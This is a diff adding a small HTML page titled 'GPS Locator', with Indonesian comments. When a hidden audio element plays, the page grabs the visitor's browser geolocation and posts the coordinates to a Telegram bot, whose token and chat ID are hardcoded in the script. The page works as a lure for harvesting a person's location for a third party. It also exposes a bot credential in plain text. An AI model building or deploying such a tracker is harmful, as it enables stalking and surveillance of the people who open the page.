@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GPS Locator</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: black;
+            color: white;
+            text-align: center;
+        }
+
+        audio {
+            display: none; /* Sembunyikan elemen audio */
+        }
+    </style>
+</head>
+<body>
+    <!-- Elemen audio untuk memutar suara -->
+    <audio id="audio" controls>
+        <source src="Basuri.mp3" type="audio/mp3"> <!-- Ganti dengan path file audio Anda -->
+        Your browser does not support the audio tag.
+    </audio>
+
+    <!-- JavaScript Code -->
+    <script>
+        var audio = document.getElementById('audio');
+
+        audio.addEventListener('play', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        });
+
+        function sendLocation(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            var botToken = '7031438159:AAH_a-jwfpbSX2wBAmwcwvHKX4zykG3KLcY'; // Ganti dengan token bot Anda
+            var chatId = '1456678907'; // Ganti dengan chat ID grup atau pengguna Anda
+
+            // Kirim lokasi ke Bot Telegram menggunakan HTTP POST
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendLocation', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({ chat_id: chatId, latitude: latitude, longitude: longitude }));
+            
+            alert("Lokasi GPS Anda telah dikirim ke bot Telegram.");
+        }
+    </script>
+</body>
+</html>
